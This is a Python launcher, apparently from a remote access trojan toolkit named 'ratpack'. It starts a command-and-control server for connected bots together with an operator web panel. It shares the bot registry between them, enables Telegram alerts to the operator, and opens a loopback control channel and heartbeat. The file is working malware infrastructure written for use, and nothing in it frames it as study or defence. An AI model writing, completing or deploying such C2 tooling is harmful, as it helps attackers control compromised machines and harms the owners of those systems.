"""
run.py — starts the C2 and the web panel together.

This is what the web-interface deployment uses. The bot-interface deployment
uses botd.py, which starts only the C2.

  python3 -m ratpack.run
"""

import sys
import threading

import uvicorn

from . import config as cfgmod
from .bots import C2Server, ControlServer, Heartbeat, log
from .panel import _panel_server


def main():
    cfg = cfgmod.load()
    if not cfg.get("secret"):
        print("panel is not configured yet; run: python3 -m ratpack.setup_wizard",
              file=sys.stderr)
        return 1

    c2 = cfg.get("c2", {})
    web = cfg.get("web", {})

    server = C2Server(cfg, cfg["secret"])

    # The panel and the C2 must share one bot registry, otherwise the panel
    # would show an empty list while the C2 has bots connected.
    server.registry = _panel_server.registry
    _panel_server.c2 = server

    # Telegram notifications, when the operator configured them.
    try:
        from .telegram import Telegram
        tg = Telegram.from_config(cfg)
        server.telegram = tg
        _panel_server.registry.telegram = tg
        if tg.configured() and tg.enabled:
            ok, msg = tg.test()
            if ok:
                log("Telegram notifications are on (%s)", msg)
            else:
                # A chat id that is not known yet is not an error: the
                # operator has to message the bot once.
                log("Telegram: %s", msg)
                log("Telegram: message the bot once and the chat is found")
    except Exception as e:
        log("Telegram setup skipped: %s", e)

    # The control channel lives on the C2 port + 1, on loopback only.
    control = ControlServer(server, "127.0.0.1", int(c2.get("port", 8777)) + 1)
    control.start()
    Heartbeat(server).start()

    threading.Thread(target=server.start, daemon=True).start()

    log("Ratpack C2 ready on %s:%s", c2.get("host"), c2.get("port"))
    print(f"Ratpack Panel: http://{web.get('host')}:{web.get('port')}/")
    print(f"  setting.json: http://{web.get('host')}:{web.get('port')}/setting.json")
    print(f"  login: {web.get('username')}")

    # The app object is passed directly instead of the import string
    # "ratpack.panel:app": uvicorn would import the module a second time and
    # that copy would get its own bot registry, so the panel would show an
    # empty list while the C2 had bots connected.
    from .panel import app
    bind_host = cfgmod.bind_address(web)
    if bind_host != web.get("host"):
        print(f"  (bound to {bind_host}; http://127.0.0.1:{web.get('port')}/ works too)")
    uvicorn.run(app, host=bind_host,
                port=int(web.get("port", 8080)), log_level="info")
    return 0


if __name__ == "__main__":
    sys.exit(main())
